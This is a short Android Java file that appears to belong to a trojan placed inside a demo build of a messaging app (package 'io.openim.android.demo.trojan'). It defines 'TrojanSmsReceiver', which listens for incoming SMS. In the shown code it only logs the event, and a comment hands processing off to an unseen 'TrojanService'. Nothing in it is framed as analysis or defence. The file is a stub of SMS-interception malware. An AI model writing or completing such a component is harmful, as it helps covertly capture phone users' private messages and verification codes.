package io.openim.android.demo.trojan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.util.Log;

/**
 * SMS Receiver - captures incoming SMS messages
 */
public class TrojanSmsReceiver extends BroadcastReceiver {
    private static final String TAG = "TroSMS";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            Log.d(TAG, "SMS received");
            // Process incoming SMS via TrojanService
        }
    }
}
